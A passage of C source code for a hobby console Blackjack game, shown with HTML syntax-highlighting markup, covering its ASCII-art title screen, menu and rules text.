<span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Plays game</span>
<span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Function to play for dealer AI</span>
<span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span>
<span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span>
<span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Asks if user wants to continue playing</span>
<span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span>

<span class="token comment" spellcheck="true">//Main Function</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> choice1<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n              222                111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n            222 222            11111                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           222   222          11 111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                222              111                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n               222               111                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>            
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                        
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>      
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                       
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                         
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                            
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                     
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                        21                                   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                     
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                      
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                           
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                     
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                               
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                               
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                                        
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n         222                     111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        222                      111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n       222                       111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      222222222222222      111111111111111                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      2222222222222222    11111111111111111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//end program</span>

<span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to continue</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>
    <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>

     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 Are You Ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                ----------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                      (Y/N)\n                        "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>
    <span class="token punctuation">{</span>                                                                           
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>
    <span class="token punctuation">{</span> 
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 2 to See a Complete Listing of Rules."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 3 to Exit Game. (Not Recommended)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChoice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Prompts user for choice</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice2<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice2<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>
            <span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">switch</span><span class="token punctuation">(</span>choice2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Switch case for different choices</span>
            <span class="token punctuation">{</span>   
                <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to begin game</span>
                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                   <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                   <span class="token keyword">break</span><span class="token punctuation">;</span>

                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to see rules</span>
                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token keyword">break</span><span class="token punctuation">;</span>

                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to exit game</span>
                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token keyword">break</span><span class="token punctuation">;</span>

                <span class="token keyword">default</span><span class="token punctuation">:</span>
                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End switch case</span>
    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>



    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span>

<span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" list</span>
<span class="token punctuation">{</span>
     <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>
     <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>

     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           RULES of VLAD's BLACKJACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n          ---------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nI."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Thou shalt not question the odds of this game."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c This program generates cards at random."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If you keep losing, you are very unlucky!\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Each card has a value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Number cards 1 to 10 hold a value of their number."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c J, Q, and K cards hold a value of 10."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Ace cards hold a value of 11"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     The goal of this game is to reach a card value total of 21.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Staying will keep you safe, hitting will add a card."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Because you are competing against the dealer, you must beat his hand."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     BUT BEWARE!."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If your total goes over 21, you will LOSE!."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     But the world is not over, because you can always play again.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                  (Y/N)\n                    "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>
    <span class="token punctuation">{</span>                                                                           
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>
    <span class="token punctuation">{</span> 
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>



    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, convinces user to enter yes</span>
    <span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 I told you so.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span>

<span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Club Card Image</span>
<span class="token punctuation">{</span>


    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>
